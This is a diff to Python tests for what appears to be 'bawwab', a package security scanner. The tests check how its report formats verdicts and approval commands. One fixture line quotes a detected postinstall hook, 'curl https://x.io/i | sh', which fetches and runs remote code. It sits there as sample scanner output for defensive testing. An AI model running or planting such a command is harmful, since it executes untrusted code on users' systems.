@@ -7,6 +7,10 @@ from bawwab.scan.rules.catalog import CATALOG
 from bawwab.store import Store
 from bawwab.types import Finding, Mode, ScanReport, Severity, Target, Verdict
 
+from bawwab.clicmd import exe as _clicmd_exe
+
+B = _clicmd_exe()  # how bawwab renders its own command (M15: never depends on PATH)
+
 
 def mk(verdict=Verdict.SUSPICIOUS, mode=Mode.STANDARD, findings=None):
     t = Target("npm", "@someone/github-mcp@1.2.0", name="@someone/github-mcp", version="1.2.0")
@@ -22,9 +26,9 @@ def test_layout_suspicious():
     assert out[0] == "⛔ bawwab: SUSPICIOUS — @someone/github-mcp@1.2.0  (standard scan)"
     assert out[1] == "  HIGH  F3a91c  package.json:7       postinstall runs: curl https://x.io/i | sh"
     assert out[2] == "  MED   F07be2  identity             name 1 edit from @modelcontextprotocol/server-github"
-    assert out[3] == "Blocked pending your approval. To allow:  ! bawwab approve A7F3"
-    assert out[4] == "Deep scan first:  ! bawwab scan --deep @someone/github-mcp@1.2.0"
-    assert out[5] == "Explain a finding:  ! bawwab explain F3a91c"
+    assert out[3] == f"Blocked pending your approval. To allow:  ! {B} approve A7F3"
+    assert out[4] == f"Deep scan first:  ! {B} scan --deep @someone/github-mcp@1.2.0"
+    assert out[5] == f"Explain a finding:  ! {B} explain F3a91c"
 
 
 def test_clean_header():
@@ -36,7 +40,7 @@ def test_clean_header():
 def test_malicious_footer():
     out = format_report(mk(Verdict.MALICIOUS), "ZZ99")
     assert out.splitlines()[0].startswith("⛔ bawwab: MALICIOUS — ")
-    assert "Blocked. Override (not recommended):  ! bawwab approve --force ZZ99" in out
+    assert f"Blocked. Override (not recommended):  ! {B} approve --force ZZ99" in out
     assert "Blocked pending" not in out
 
 
